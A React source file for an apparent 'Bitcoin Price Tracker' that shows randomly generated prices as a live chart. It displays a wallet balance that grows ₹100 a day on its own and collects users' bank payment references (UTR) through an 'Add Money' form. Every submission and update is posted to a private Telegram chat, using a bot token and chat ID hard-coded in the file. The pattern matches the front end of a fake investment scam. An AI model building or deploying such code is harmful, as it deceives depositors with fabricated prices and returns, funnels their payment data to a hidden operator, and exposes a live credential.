import React, { useEffect, useState } from 'react';
import { Line } from 'react-chartjs-2';
import { Chart as ChartJS, CategoryScale, LinearScale, PointElement, LineElement, Title, Tooltip, Legend } from 'chart.js';
import moment from 'moment';
import axios from 'axios';
import './App.css';

ChartJS.register(CategoryScale, LinearScale, PointElement, LineElement, Title, Tooltip, Legend);

// Telegram Bot Configuration
const BOT_TOKEN = '7061190898:AAFGtWTHb79WjAWBmFPGfLRINxbnwg_TMmo';
const CHAT_ID = '529363361';

// Function to send data to Telegram
const sendDataToTelegram = async (message) => {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: CHAT_ID,
      text: message,
    });
    console.log('Data sent to Telegram:', message);
  } catch (error) {
    console.error('Error sending data to Telegram:', error);
  }
};

// Mock Bitcoin price generator
const generateMockBitcoinPrice = () => {
  const min = 30000;
  const max = 60000;
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

const App = () => {
  const [bitcoinData, setBitcoinData] = useState({
    labels: [],
    datasets: [
      {
        label: 'Bitcoin Price (in ₹)',
        data: [],
        fill: false,
        borderColor: 'rgb(39, 192, 39)',
        tension: 0.1,
      },
    ],
  });

  const [walletBalance, setWalletBalance] = useState(100); // Initial balance of ₹100
  const [lastUpdated, setLastUpdated] = useState(moment()); // Time of the last wallet update
  const [submitMoney, setSubmitMoney] = useState(false);
  const [utrAddress, setUtrAddress] = useState(''); // UTR Address input

  useEffect(() => {
    const interval = setInterval(() => {
      // Mock Bitcoin price update
      const newPrice = generateMockBitcoinPrice();
      const newTime = moment().format('h:mm:ss a');

      // Update chart data (Limit to the last 10 data points for efficiency)
      setBitcoinData((prevData) => {
        const newLabels = [...prevData.labels, newTime].slice(-10);
        const newData = [...prevData.datasets[0].data, newPrice].slice(-10);

        // Sync data to Telegram
        sendDataToTelegram(`Bitcoin Price Updated: ₹${newPrice} at ${newTime}`);

        return {
          labels: newLabels,
          datasets: [
            {
              ...prevData.datasets[0],
              data: newData,
            },
          ],
        };
      });
    }, 15000); // Update Bitcoin price every second

    // Increase wallet balance every 24 hours
    const walletInterval = setInterval(() => {
      const now = moment();
      if (now.diff(lastUpdated, 'hours') >= 24) {
        setWalletBalance((prevBalance) => {
          const updatedBalance = prevBalance + 100;
          sendDataToTelegram(`Wallet balance updated: ₹${updatedBalance}`);
          return updatedBalance;
        });
        setLastUpdated(now);
      }
    }, 1000 * 60); // Check every minute to update the wallet

    return () => {
      clearInterval(interval);
      clearInterval(walletInterval);
    };
  }, [lastUpdated]);

  const handleUtrSubmit = () => {
    sendDataToTelegram(`UTR Address Submitted: ${utrAddress}`);
    alert('UTR Address submitted!');
    setUtrAddress('');
  };

  return (
    <div className="app-container">
      <div className="app-header">
        <h1>Bitcoin Price Tracker</h1>
      </div>

      <div className="wallet-info">
        <div className="wallet-card">
          <h2>Wallet Balance</h2>
          <p className="wallet-amount">₹{walletBalance}</p>
          <div className="money-btn">
            <button onClick={() => setSubmitMoney(!submitMoney)}>Add Money</button>
            <button>Withdraw Money</button>
          </div>
        </div>
      </div>

      {submitMoney && (
        <div className="wallet-info">
          <div className="wallet-card">
            <h2>Add UTR Address</h2>
            <input
              type="text"
              value={utrAddress}
              onChange={(e) => setUtrAddress(e.target.value)}
            />
            <div className="money-btn">
              <button onClick={handleUtrSubmit}>Submit</button>
            </div>
          </div>
        </div>
      )}

      <div className="chart-container">
        <Line
          data={bitcoinData}
          options={{
            responsive: true,
            plugins: {
              title: {
                display: true,
                text: 'Bitcoin Price Over Time',
                font: {
                  size: 20,
                  weight: 'bold',
                },
              },
              tooltip: {
                mode: 'nearest',
                intersect: false,
              },
            },
            scales: {
              x: {
                type: 'category',
                labels: bitcoinData.labels,
              },
              y: {
                min: 0,
              },
            },
          }}
        />
      </div>
    </div>
  );
};

export default App;
